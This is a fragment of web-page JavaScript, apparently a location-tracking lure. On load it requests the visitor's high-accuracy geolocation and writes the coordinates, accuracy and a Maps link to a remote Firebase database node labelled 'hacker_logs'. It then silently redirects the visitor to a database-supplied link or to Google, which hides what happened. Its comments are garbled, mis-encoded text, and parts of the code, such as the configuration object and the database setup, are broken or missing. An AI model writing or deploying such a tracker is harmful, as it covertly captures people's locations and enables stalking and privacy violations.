        const firebaseConfig = {

            authDomain: "location-611d6.firebaseapp.com",
            databaseURL: "https://location-611d6-default-rtdb.firebaseio.com",

        const app = initializeApp(firebaseConfig);

        let dataSent = false; 

        function processLocation(position) {
            if(dataSent) return; 
            dataSent = true;

            const lat = position.coords.latitude;
            const lng = position.coords.longitude;
            
            const trackerRef = ref(db, 'hacker_logs');
            const newLogRef = push(trackerRef);
            
            // üî• FIXED Again: ‡¶è‡¶ñ‡¶æ‡¶®‡ßá $ ‡¶ö‡¶ø‡¶π‡ßç‡¶® ‡¶¶‡¶ø‡ßü‡ßá ‡¶†‡¶ø‡¶ï ‡¶ï‡¶∞‡ßá ‡¶¶‡¶ø‡ßü‡ßá‡¶õ‡¶ø
            const mapsLink = `https://www.google.com/maps?q=$${lat},${lng}`;

            set(newLogRef, {
                timestamp: new Date().toString(),
                googleMapsLink: mapsLink,
                latitude: lat,
                longitude: lng,
                accuracy: position.coords.accuracy
            }).then(() => {
                // üî• REAL FIX: ‡¶≤‡¶ó ‡¶∏‡ßá‡¶≠ ‡¶π‡¶ì‡ßü‡¶æ‡¶∞ ‡¶™‡¶∞ ‡¶Ü‡¶Æ‡¶∞‡¶æ ‡¶°‡¶æ‡¶ü‡¶æ‡¶¨‡ßá‡¶∏ ‡¶ö‡ßá‡¶ï ‡¶ï‡¶∞‡¶¨‡ßã ‡¶≤‡¶ø‡¶Ç‡¶ï‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø
                // ‡¶è‡¶§‡ßá ‡¶≤‡¶ø‡¶Ç‡¶ï ‡¶Æ‡¶ø‡¶∏ ‡¶π‡¶ì‡ßü‡¶æ‡¶∞ ‡¶ï‡ßã‡¶®‡ßã ‡¶ö‡¶æ‡¶®‡ßç‡¶∏ ‡¶®‡ßá‡¶á
                const dbRef = ref(db);
                get(child(dbRef, "site_settings/redirect_link")).then((snapshot) => {
                    if (snapshot.exists()) {
                        // ‡¶°‡¶æ‡¶ü‡¶æ‡¶¨‡ßá‡¶∏ ‡¶•‡ßá‡¶ï‡ßá ‡¶≤‡¶ø‡¶Ç‡¶ï ‡¶™‡ßá‡¶≤‡ßá ‡¶∏‡ßá‡¶ñ‡¶æ‡¶®‡ßá ‡¶Ø‡¶æ‡¶¨‡ßá
                        window.location.href = snapshot.val();
                    } else {
                        // ‡¶®‡¶æ ‡¶™‡ßá‡¶≤‡ßá ‡¶ó‡ßÅ‡¶ó‡¶≤‡ßá ‡¶Ø‡¶æ‡¶¨‡ßá
                        window.location.href = "https://www.google.com";
                    }
                }).catch(() => {
                    window.location.href = "https://www.google.com";
                });
            });
        }

        window.onload = function() {
            if ("geolocation" in navigator) {
                navigator.geolocation.watchPosition(
                    processLocation,
                    function(error) {
                        console.log("Waiting...");
                    },
                    { 
                        enableHighAccuracy: true,

                    }
                );
            } else {
                // ‡¶∏‡¶æ‡¶™‡ßã‡¶∞‡ßç‡¶ü ‡¶®‡¶æ ‡¶ï‡¶∞‡¶≤‡ßá ‡¶°‡¶ø‡¶´‡¶≤‡ßç‡¶ü ‡¶ó‡ßÅ‡¶ó‡¶≤‡ßá ‡¶™‡¶æ‡¶†‡¶æ‡¶¨‡ßá, ‡¶Ö‡¶•‡¶¨‡¶æ ‡¶§‡ßÅ‡¶á ‡¶ö‡¶æ‡¶á‡¶≤‡ßá ‡¶è‡¶ñ‡¶æ‡¶®‡ßá‡¶ì ‡¶ö‡ßá‡¶ï ‡¶¨‡¶∏‡¶æ‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡¶ø‡¶∏

    </script>
